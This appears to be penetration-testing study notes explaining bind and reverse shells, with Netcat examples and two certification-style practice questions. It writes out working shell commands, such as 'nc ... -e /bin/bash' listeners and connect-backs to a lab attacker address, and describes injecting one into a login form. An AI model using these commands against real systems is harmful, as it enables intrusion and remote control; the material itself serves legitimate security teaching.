A _shell_ is a utility (software) that acts as an interface between a user and the operating system (the kernel and its services). For example, in Linux there are several shell environments, such as Bash, ksh, and tcsh. Traditionally, in Windows the shell is the command prompt (command-line interface), which is invoked by cmd.exe. Windows PowerShell is a newer Microsoft shell that combines the old CMD functionality with a new scripting/cmdlet instruction set with built-in system administration functionality. PowerShell cmdlets allow users and administrators to automate complicated tasks with reusable scripts.

**NOTE** Microsoft has released a full list of and documentation for all supported Windows commands; see [_https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands_](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands).

Let’s go over the differences between the bind and reverse shells. With a bind shell, an attacker opens a port or a listener on the compromised system and waits for a connection. This is done in order to connect to the victim from any system and execute commands and further manipulate the victim. Figure 8-1 illustrates a bind shell.

**_Figure 8-1_** _- A Bind Shell_

![[Pasted image 20240618085019.png]]

A reverse shell is a vulnerability in which an attacking system has a listener (port open), and the victim initiates a connection back to the attacking system. Figure 8-2 illustrates a reverse shell.

**_Figure 8-2_** _- A Reverse Shell_

![[Pasted image 20240618085053.png]]

Many tools allow you to create bind and reverse shells from a compromised host. Some of the most popular ones are the Meterpreter module in Metasploit and Netcat. Netcat is one of the best and most versatile tools for pen testers because it is lightweight and very portable. You can even see this spelled out in the first few paragraphs of the **netcat** man page, as shown in Example 8-1.

**_Example 8-1_** _-_ _The Netcat Tool_

![[Pasted image 20240618085139.png]]

Let’s look at Netcat in action. An attacker could use the **nc -lvp 1234 -e /bin/bash** command in the compromised system (192.168.78.6) to create a listener on port **1234** and execute (**-e**) the Bash shell (**/bin/bash**). This is demonstrated in Example 8-2. Netcat uses standard input (stdin), standard output (stdout), and standard error (stderr) to the IP socket.

**_Example 8-2_** _-_ _Creating a Bind Shell Using Netcat_

```
omar@jorel:~$ nc -lvp 1234 -e /bin/bash
listening on [any] 1234 ...
```

**NOTE** In Windows systems, you can execute the cmd.exe command prompt utility with the **nc -lvp 1234 -e cmd.exe** Netcat command.

As shown in Example 8-3, on the attacking system (192.168.78.147), the **nc -nv 192.168.78.6 1234** command is used to connect to the victim. Once the attacker (192.168.78.147) connects to the victim (192.168.78.6), the **ls** command is invoked, and three files are shown in the attacker screen.

**_Example 8-3_** _-_ _Connecting to the Bind Shell by Using Netcat_

```
root@kali:~# nc -nv 192.168.78.6 1234
(UNKNOWN) [192.168.78.6] 1234 (?) open
ls
secret_doc_1.doc
secret_doc_2.pdf
secret_doc_3.txt
```

When the attacker connects, the highlighted message in Example 8-4 is displayed in the victim’s system.

**_Example 8-4_** _-_ _An Attacker Connected to a Victim Using a Bind Shell_

```
omar@jorel:~$ nc -lvp 1234 -e /bin/bash
listening on [any] 1234 ...
connect to [192.168.78.6] from (UNKNOWN) [192.168.78.147] 52100 
```

One of the challenges of using bind shells is that if the victim’s system is behind a firewall, the listening port might be blocked. However, if the victim’s system can initiate a connection to the attacking system on a given port, a reverse shell can be used to overcome this challenge.

Example 8-5 shows how to create a reverse shell using Netcat. In this case, in order to create a reverse shell, you can use the **nc -lvp 666** command in the attacking system to listen to a specific port (port 666 in this example).

**_Example 8-5_** _-_ _Creating a Listener in the Attacking System to Create a Reverse Shell Using Netcat_

```
root@kali:~# nc -lvp 666
listening on [any] 666 ...
192.168.78.6: inverse host lookup failed: Unknown host
connect to [192.168.78.147] from (UNKNOWN) [192.168.78.6] 32994
ls
secret_doc_1.doc
secret_doc_2.pdf
secret_doc_3.txt 
```

Then on the compromised host (the victim), you can use the **nc 192.168.78.147 666 -e /bin/bash** command to connect to the attacking system, as demonstrated in Example 8-6.

**_Example 8-6_** _-_ _Connecting to the Attacking System (Reverse Shell) Using Netcat_

```
omar@jorel:~$ nc 192.168.78.147 666 -e /bin/bash
```

Once the victim system (192.168.78.6) is connected to the attacking system (192.168.78.147), you can start invoking commands, as shown in the highlighted lines in Example 8-7.

**_Example 8-7_** _-_ _Executing Commands in the Victim’s System via a Reverse Shell_

![[Pasted image 20240618085631.png]]

Table 8-2 lists several useful Netcat commands that could be used in a penetration testing engagement.

**_Table 8-2_** _-_ _Useful Netcat Commands_

![[Pasted image 20240618085705.png]]

**NOTE** Additional Netcat commands and references for post-exploitation tools can be obtained from [_https://github.com/The-Art-of-Hacking/art-of-hacking_](https://github.com/The-Art-of-Hacking/art-of-hacking).

The Meterpreter module of the Metasploit framework can also be used to create bind and reverse shells and to perform numerous other post-exploitation tasks. Table 8-3 includes some of the most common Meterpreter commands.

**_Table 8-3_** _-_ _Common Meterpreter Commands_

![[Pasted image 20240618085811.png]]

**TIP** Metasploit Unleashed is a free detailed Metasploit course released by Offensive Security. The course can be accessed at [_https://www.offensive-security.com/metasploit-unleashed_](https://www.offensive-security.com/metasploit-unleashed).

---

You have discovered a remote code execution vulnerability on what appears to be an unauthorized web server set up by a Pixel Paradise developer. You have successfully injected and executed the following code into the server login form: **nc 192.168.78.145 777 -e /bin/bash**. On your penetration testing VM at 192.168.78.145, you have entered the following: **nc -lvp 777**. What type of access have you established to the victim?

In this scenario, the attacking system creates a reverse shell by first using the **nc -lvp 777** command to listen to a specific port (port 777) on the attacking machine. Then on the compromised host (the victim), you inject and execute the **nc 192.168.78.145 777 -e /bin/bash** command to establish a connection with the attacking system. Once the victim system (192.168.78.4) is connected to the attacking system (192.168.78.145), commands can be executed in the bash shell of the victim by the attacker.

---

You are getting familiar with the Meterpreter module of Metasploit in order to create bind and reverse shells and perform other post-exploitation tasks on a compromised system that is on a pentesting client's network. Match the Meterpreter command to its function.

![[Pasted image 20240618092143.png]]

